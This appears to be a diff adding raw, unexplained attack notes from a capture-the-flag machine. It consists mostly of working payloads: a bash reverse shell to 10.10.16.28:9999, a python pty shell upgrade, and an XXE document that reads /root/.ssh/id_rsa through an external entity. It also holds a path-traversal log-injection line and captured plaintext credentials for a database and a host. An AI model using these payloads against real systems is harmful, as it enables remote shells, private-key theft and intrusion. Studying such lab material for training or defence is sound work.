@@ -1,0 +1,49 @@
+chr<scm>
+    <connection>scm:git:git@github.com:mysql/mysql-connector-j.git</connection>
+    <url>https://github.com/mysql/mysql-connector-j</url>
+  </scm>
+
+
+      <username>repouser</username>
+      <password>repopwd</password>
+
+
+----------------------------------------------
+/usr/bin/bash -c /usr/bin/bash -i >& /dev/tcp/10.10.16.28/9999 0>&1
+
+conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/red_panda", "woodenk", "RedPandazRule");
+
+woodenk@10.10.11.170
+RedPandazRule
+
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY example SYSTEM "/root/.ssh/id_rsa"> ]>
+<credits>
+  <author>woodenk</author>
+  <image>
+    <uri>/img/greg.jpg</uri>
+    <views>0</views>
+  </image>
+  <image>
+    <uri>/img/hungy.jpg</uri>
+    <views>0</views>
+  </image>
+  <image>
+    <uri>/img/smooch.jpg</uri>
+    <views>0</views>
+  </image>
+  <image>
+    <uri>/img/smiley.jpg</uri>
+    <views>0</views>
+  </image>
+  <totalviews>&example;</totalviews>
+</credits>
+
+_creds.xml
+
+
+304||10.10.16.28||Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (
+KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36||../../..//home/woodenk/greg.jpg
